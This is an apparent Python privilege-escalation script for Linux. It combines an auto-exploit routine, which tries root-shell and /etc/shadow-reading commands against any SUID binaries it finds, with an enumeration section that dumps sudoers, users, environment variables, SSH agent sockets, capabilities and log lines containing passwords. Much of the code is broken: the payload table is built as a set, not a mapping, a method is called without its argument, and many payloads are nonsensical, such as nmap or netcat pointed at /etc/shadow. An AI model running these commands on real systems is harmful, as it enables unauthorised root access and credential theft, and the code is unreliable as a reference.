#!/bin/python3

# For simplicity reasons, this script will only run with Python3.
# If Python3 is not installed, you can use this script:
# https://github.com/cervoise/linuxprivcheck/blob/master/linuxprivchecker3.py

import os
import subprocess as s

class Color:
    YELLOW = '\033[0;33m'
    GREEN = '\033[0;32m'
    RED = '\033[0;31m'
    RESET_ALL = '\033[0m'

class Command:
    def __init__(self, command, comment, alternative=''):
        self.command = command
        self.comment = comment
        self.alternative = alternative
        self.output = ''

    def popen(self, command):
        out, _ = s.Popen([command], stdout=s.PIPE, stderr=s.PIPE, shell=True).communicate()
        return out.decode('utf-8').strip()

    def run_command_wrapper(self) -> str:
        output = self.popen(self.command)
        return self.popen(self.alternative) if output == '' and self.alternative != '' else output

    def run(self):
        self.output = self.run_command_wrapper()
        if self.output == '':
            print(f'{Color.RED} [-] Not output for {self.comment}{Color.RESET_ALL}')
        else:
            print(f'{Color.GREEN} [+] {self.comment}:\n{Color.RESET_ALL}{self.output}')


class AutoExploit:
    gtfobins_payloads = {
        'ash', Command(command='ash', comment='run ash'),
        'bash', Command(command='bash -p', comment='run bash'),
        'busybox', Command(command='busybox sh', comment='run busybox shell'),
        'chroot', Command(command='chroot / /bin/sh -p', comment='run chroot shell as root'),
        'csh', Command(command='csh -b', comment='run csh as root'),
        'cut', Command(command='cut -d "" -f 1 /etc/shadow', comment='run cut to get fields of /etc/shadow'),
        'dash', Command(command='dash -p', comment='run dash as root'),
        'docker', Command(command='docker run -v /:/mnt --rm -it alpine chroot /mnt sh -p', comment='run docker as root'),
        'emacs', Command(command='emacs -Q -nw --eval \'(term "/bin/sh -p")\'', comment='run emacs shell as root'),
        'env', Command(command='env /bin/sh -p', comment='run env shell as root'),
        'expect', Command(command='expect -c "spawn /bin/sh -p; expect -regexp \"Password:\"; send -- \"\r\"; interact"', comment='run expect shell as root'),
        'fish', Command(command='fish -c "sh -p"', comment='run fish as root'),
        'find', Command(command='find / -exec /bin/sh -p \\;', comment='run find as root'),
        'flock', Command(command='flock -c /bin/sh -p', comment='run flock as root'),
        'fuser', Command(command='fuser -c /bin/sh -p', comment='run fuser as root'),
        'gawk', Command(command='gawk \'BEGIN {system("/bin/sh")}\'', comment='run gawk as root'),
        'gdb', Command(command='gdb -q -nx -ex \'python import os; os.execl("/bin/sh", "sh", "-p")\' -ex quit', comment='run gdb shell as root'),
        'gimp', Command(command='gimp -idf --batch-interpreter=python-fu-eval -b \'import os; os.execl("/bin/sh", "sh", "-p")\'', comment='run gimp shell as root'),
        'ionice', Command(command='ionice -c /bin/sh -p', comment='run ionice shell as root'),
        'jrunscript', Command(command='jrunscript -e "exec(\'/bin/sh -pc \\$@|sh\\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)\')"', comment='run jrunscript shell as root'),
        'ksh', Command(command='ksh -p', comment='run ksh as root'),
        'ld.so', Command(command='ld.so -e /bin/sh -p', comment='run ld.so shell as root'),
        'less', Command(command='less -F /etc/shadow', comment='run less to get fields of /etc/shadow'),
        'ltrace', Command(command='ltrace -f /bin/sh -p', comment='run ltrace as root'),
        'make', Command(command='make -f /bin/sh -p', comment='run make as root'),
        'mawk', Command(command='mawk \'BEGIN {system("/bin/sh")}\'', comment='run mawk as root'),
        'more', Command(command='more /etc/shadow', comment='run more to get fields of /etc/shadow'),
        'mount', Command(command='mount -t tmpfs -o loop /dev/null /tmp/', comment='run mount as root'),
        'mtr', Command(command='mtr -r -c 1 -n -s /etc/shadow', comment='run mtr as root'),
        'nano', Command(command='nano -c /etc/shadow', comment='run nano as root'),
        'nc', Command(command='nc -l -p /etc/shadow', comment='run nc as root'),
        'netcat', Command(command='netcat -l -p /etc/shadow', comment='run netcat as root'),
        'nmap', Command(command='nmap -sU -p /etc/shadow', comment='run nmap as root'),
        'nop', Command(command='nop -c /etc/shadow', comment='run nop as root'),
        'nslookup', Command(command='nslookup /etc/shadow', comment='run nslookup as root'),
        'ntpdate', Command(command='ntpdate -u /etc/shadow', comment='run ntpdate as root'),
        'perl', Command(command='perl -e \'exec("/bin/sh -p")\'', comment='run perl as root'),
        'php', Command(command='php -r \'exec("/bin/sh -p")\'', comment='run php as root'),
        'python', Command(command='python -c \'import os; os.execl("/bin/sh", "sh", "-p")\'', comment='run python as root'),
        'python3', Command(command='python3 -c \'import os; os.execl("/bin/sh", "sh", "-p")\'', comment='run python3 as root'),
        'readelf', Command(command='readelf -s /etc/shadow', comment='run readelf as root'),
        'rlogin', Command(command='rlogin -l root /bin/sh -p', comment='run rlogin as root'),
        'rsh', Command(command='rsh -l root /bin/sh -p', comment='run rsh as root'),
        'ruby', Command(command='ruby -e \'exec("/bin/sh -p")\'', comment='run ruby as root'),
        'sed', Command(command='sed -e \'s/^.*$/root/\' /etc/shadow', comment='run sed as root'),
        'sh', Command(command='/bin/sh -p', comment='run /bin/sh as root'),
        'rpm', Command(command='rpm --eval \'%{lua:os.execute("/bin/sh", "-p")}\'', comment='run rpm shell as root'),
        'socat', Command(command='socat - /bin/sh -p', comment='run socat as root'),
        'strace', Command(command='strace -f /bin/sh -p', comment='run strace as root'),
        'tcpdump', Command(command='tcpdump -s0 -w /dev/null -p /etc/shadow', comment='run tcpdump as root'),
        'telnet', Command(command='telnet -l root /bin/sh -p', comment='run telnet as root'),
        'tftp', Command(command='tftp -c get /etc/shadow', comment='run tftp as root'),
        'traceroute', Command(command='traceroute -m 1 /etc/shadow', comment='run traceroute as root'),
        'traceroute6', Command(command='traceroute6 -m 1 /etc/shadow', comment='run traceroute6 as root'),
        'tsh', Command(command='tsh -p', comment='run tsh as root'),
        'vi', Command(command='vi -c /etc/shadow', comment='run vi as root'),
        'vim', Command(command='vim -c /etc/shadow', comment='run vim as root'),
        'watch', Command(command='watch -c /bin/sh -p', comment='run watch as root'),
    }

    def run(self):
        command = "find / -perm -4000 -type f 2>/dev/null"
        suids = os.popen(command).read().strip().split("\n")

        for suid in suids:
            sname = suid.split("/")[::-1][0]
            print(f'\t{Color.YELLOW}SUID binary:{sname}{Color.RESET_ALL}')
            if sname in self.gtfobins_payloads:
                self.gtfobins_payloads[sname].popen() # type: ignore


#################################
######### ENUMERATION ###########
#################################

print(f'{Color.YELLOW}[*] Attempting auto-exploit{Color.RESET_ALL}')
AutoExploit().run()


print(f'{Color.YELLOW}[*] System Info{Color.RESET_ALL}')
Command("hostnamectl | grep 'Operating System | cut -d : -f 2'", "Operating System").run()
Command("cat /proc/version", "Kernel version").run()
Command("hostname", "Hostname").run()

print(f'\n{Color.YELLOW}[*] Network Info{Color.RESET_ALL}')
Command("/sbin/ifconfig -a", "Network Interfaces", "ip address show").run()
Command("route", "Route", "ip route").run()
Command("netstat -antup | grep -v 'TIME_WAIT'", "Network status", "ss -lut | grep -v 'TIME_WAIT'").run()

print(f'\n{Color.YELLOW}[*] Filesystem Info{Color.RESET_ALL}')
Command("mount", "mount output").run()
Command("cat /etc/fstab 2>/dev/null", "fstab entries").run()

print(f'\n{Color.YELLOW}[*] Cron jobs{Color.RESET_ALL}')
Command("ls -la /etc/cron* 2>/dev/null", "Scheduled cron jobs").run()
Command("ls -laR /etc/cron 2>/dev/null | awk '$1 ~ /w.$/' 2>/dev/null", "Writable cron jobs").run()


print(f'\n{Color.YELLOW}[*] Current user info{Color.RESET_ALL}')
Command("whoami", "Current user").run()
Command("sudo -l", "Sudo configuration").run()
Command("doas -l", "Doas configuration").run()
Command("id", "Current user id").run()
Command("cat /etc/passwd", "All users").run()
Command("grep -v -E '^#' /etc/passwd | awk -F: '$3 == 0{print $1}'", "Super users").run()
Command("grep 'docker\\|lxd' /etc/group", "Users in Docker group").run()
Command("env 2>/dev/null | grep -v 'LS_COLORS'", "Env values").run()
Command("cat /etc/sudoers 2>dev/null | grep -v '#' 2>/dev/null", "sudoers file").run()
Command("w 2>/dev/null", "user's activity").run()
Command("ls /tmp/ssh* 2>dev/null", "SSH Agent connection (lookup ssh agent hijacking)").run()
Command("screen -ls 2>/dev/null", "Screen active socket").run()
Command("tmux ls 2>/dev/null", "Tmux active socket").run()


print(f'\n{Color.YELLOW}[*] Programs information{Color.RESET_ALL}')
Command("find / -perm -u=s -type f 2>/dev/null", "Check if there is programs with special perms").run()
Command("find / \\( -wholename '/home'homedir*' -prune \\) \
        -o \\( -type d -perm -0002) -exec ls -ld '{}' ';' \
        2>/dev/null| grep root",
        "Writable directories for root group").run()
Command("find / \\( -wholename '/home/homedir/*' -prune -o \
        -wholename '/proc/*' -prune \\) -o \\( -type f -perm -0002 \\) \
        -exec ls -l '{}' ';' 2>/dev/null",
        "Writable directories for users group").run()
Command("find / \\( -perm -2000 -o -perm -4000 \\) -exec ls -ld {} \\; 2>/dev/null",
        "SUID/SGID files and directories").run()
Command("ls -ahlR /root 2>/dev/null", "/root folder content").run()
Command("getcap -r  / 2> /dev/null", "Checking capabilities").run()
Command("find /var/log -name '*.log' 2>/dev/null | \
        xargs -l10 egrep 'pwd|password' 2>/dev/null",
        "Logs containing 'password'").run()

print(f'\n{Color.YELLOW}[*] Current processes info{Color.RESET_ALL}')
Command("ps aux | awk '{print($1,$2,$9,$10,$11)}'", "Running processes").run()
Command("sudo -V | grep version 2>/dev/null", "Sudo version").run()
Command("apache2 -v; apache2ctl -M; httpd -v; apachectl -l 2>/dev/null", "Apache version").run()
Command("cat /etc/apache2/apache2.conf 2>/dev/null", "Apache config").run()

print(f'\n{Color.YELLOW}[*] Other priv-esc vectors{Color.RESET_ALL}')
Command("which awk perl python ruby gcc cc vi vim nmap find netcat nc wget \
        tftp ftp 2>/dev/null", "local installed exploit tools").run()



